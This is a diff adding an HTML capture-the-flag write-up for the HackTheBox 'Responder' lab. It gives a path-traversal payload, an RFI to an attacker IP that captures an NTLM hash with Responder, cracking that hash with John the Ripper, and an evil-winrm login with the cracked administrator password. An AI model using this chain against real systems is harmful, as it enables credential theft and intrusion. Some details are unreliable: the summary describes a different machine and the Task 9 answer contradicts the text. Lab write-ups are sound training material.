@@ -1,1 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - (Tier 1) Responder Writeup</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #0f0f0f;
+      color: #ffffff;
+      padding: 2rem;
+      max-width: 800px;
+      margin: auto;
+    }
+    h1 {
+      color: #00ffcc;
+      border-bottom: 2px solid #00ffcc;
+      padding-bottom: 0.5rem;
+    }
+    h2 {
+      color: #00ccff;
+    }
+    pre {
+      background-color: #1e1e1e;
+      padding: 1rem;
+      border-radius: 5px;
+      overflow-x: auto;
+    }
+    a {
+      color: #00ccff;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <h1>HackTheBox: Responder</h1>
 
+  <h2>📝 Summary</h2>
+  <p>Redeemer is a beginner-friendly Linux machine that focuses on Redis, Vulnerability Assessment, Databases, Reconnaissance, and Anonymous/Guest Access.</p>
+
+  <h2>TASK 1: When visiting the web service using the IP address, what is the domain that we are being redirected to?</h2>
+  <pre>unika.htb</pre>
+  <ol>
+    <li>Enter the following into the search bar: http://{ip address}</li>
+    <li>The search bar should indicate that the website being reached is unika.htb.</li>
+    <li>However, to get rid of the error, we have to add the IP address and domain to the "/etc/hosts" file within our machine.</li>
+    <li>Within CLI, use any text/file editor to open the "/etc/hosts" file and append the IP address & domain name.</li>
+    <li>In doing so, after refreshing the webpage, it should load the website properly.</li>
+  </ol>
+  <h2>Task 2: Which scripting language is being used on the server to generate webpages?</h2>
+  <pre>php</pre>
+  <p>nmap -sV -sC -T4 {ip address}</p>
+
+  <h2>Task 3: What is the name of the URL parameter which is used to load different language versions of the webpage?</h2>
+  <pre>page</pre>
+  <ol>
+    <li>On the website, switch from English to French with the language button in the top-right of the homepage.</li>
+    <li>After switching successfully, you will observe a different url in the search bar: "unikahtb/index.php?page=french.html"</li>
+    <li>The page parameter is what we are looking for.</li>
+  </ol>
+
+  <h2>Task 4: Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"</h2>
+  <pre>../../../../../../../../windows/system32/drivers/etc/hosts</pre>
+  <p>Can be obtained through a simple Google search or the fact that "../" enables access to "etc/hosts."</p>
+
+  <h2>Task 5: Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"</h2>
+  <pre>//10.10.14.6/somefile</pre>
+  <p>Can be obtained through a simple Google search or the fact that an ip address is required for an RFI.</p>
+
+  <h2>Task 6: What does NTLM stand for?</h2>
+  <pre>New Technology Lan Manager</pre>
+  <p>Can be obtained through a simple Google search.</p>
+
+  <h2>Task 7: Which flag do we use in the Responder utility to specify the network interface?</h2>
+  <pre>-I</pre>
+  <p>Can be obtained through a simple Google search or by doing "responder --help" within CLI.</p>
+
+  <h2>Task 8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?</h2>
+  <pre>John the Ripper</pre>
+  <p>Can be obtained through a simple Google search.</p>  
+  
+  <h2>Task 9: What is the password for the administrator user?</h2>
+  <pre>4</pre>
+  <ol>
+    <li>Within CLI, type "responder -I tun0 (network interface) or {ip address}"</li>
+    <li>To ensure that responder is capturing events, we can alter the url on our webpage as the following: "http://unkia.htb/index.php?page=//{ip address}/ShareFileHTB" (RFI).</li>
+    <li>Checking back on the terminal, we should obtain a username and hash, which we can copy to a local file.</li>
+    <li>echo "HASH" > hash.txt</li>
+    <li>Next, make sure that you have the rockyou.txt file saved locally, as we will need it for the John the Ripper command.</li>
+    <li>john -w="PATH TO ROCKYOU.txt" hash.txt</li>
+    <li>After running the command, you will obtain the password (badminton) for the username (administrator).</li>
+    <li>To exploit the account, we have to find a service.</li>
+  </ol>
+
+  <h2>Task 10: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2>
+  <pre>5985</pre>
+  <p>nmap -sV -sC -T4 -v {ip address}</p>
+
+  <h2>SUBMIT FLAG: Submit root flag</h2>
+  <pre>ea81b7afddd03efaa0945333ed147fac</pre>
+  <ol>
+    <li>evil-winrm -i {ip address} -u administrator -p badminton</li>
+    <li>cd ../../</li>
+    <li>cd mike</li>
+    <li>dir</li>
+    <li>cd Desktop</li>
+    <li>dir</li>
+    <li>type flag.txt</li>
+  </ol>
+
+  
+  <h2>🎯 Lessons Learned</h2>
+  <ul>
+    <li>Learned how to identify a redirected domain and configure <code>/etc/hosts</code> to resolve custom domains locally.</li>
+    <li>Discovered a Local File Inclusion (LFI) vulnerability by manipulating the <code>page</code> parameter in a URL.</li>
+    <li>Understood the concept of Remote File Inclusion (RFI) and how it can lead to NTLM hash capture.</li>
+    <li>Used <code>Responder</code> to capture NetNTLMv2 hashes through RFI exploitation.</li>
+    <li>Cracked captured hashes using <code>John the Ripper</code> and a common wordlist (<code>rockyou.txt</code>).</li>
+    <li>Accessed a remote Windows service with <code>evil-winrm</code> to retrieve the flag.</li>
+    <li>Reinforced the risks of unsanitized user input and insecure file inclusion vulnerabilities on web servers.</li>
+</ul>
+
+  <p><a href="/SharvM/index.html">⬅ Back to Portfolio</a></p>
